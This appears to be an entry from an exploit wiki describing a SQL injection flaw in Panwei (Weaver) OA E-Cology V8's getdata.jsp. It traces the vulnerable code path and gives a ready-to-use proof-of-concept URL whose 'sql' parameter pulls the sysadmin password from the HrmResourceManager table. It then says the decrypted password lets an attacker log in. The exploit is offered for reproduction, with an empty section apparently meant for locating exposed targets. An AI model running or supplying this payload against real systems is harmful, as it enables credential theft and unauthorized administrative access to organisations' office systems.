# Panwei OA E-Cology getdata.jsp SQL injection vulnerability

## Vulnerability Description

Panwei OA V8 has SQL injection vulnerability, and attackers can obtain administrator and server permissions through vulnerabilities.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Panwei OA V8</span>

## Network surveying and mapping



## Vulnerability reappears

In getdata.jsp, directly hand over the request object to

`weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :` 

Method processing



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fanwei-17.png)



In the getData method, determine whether the cmd parameter in the request is empty. If it is not empty, call the proc method



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fanwei-18.png)





In the proc method, judge the cmd parameter value. When the cmd value is equal to getSelectAllId, the two parameter values ​​of sql and type are obtained from the request, and the parameters are passed into the getSelectAllIds(sql, type) method

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fanwei-19.png)





POC

```plain
https://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

Query the password field in the HrmResourceManager table, and the page returns the value of the first record of the database (sysadmin user password)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fanwei-20.png)



After decryption, you can log in to the system

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/fanwei-21.png)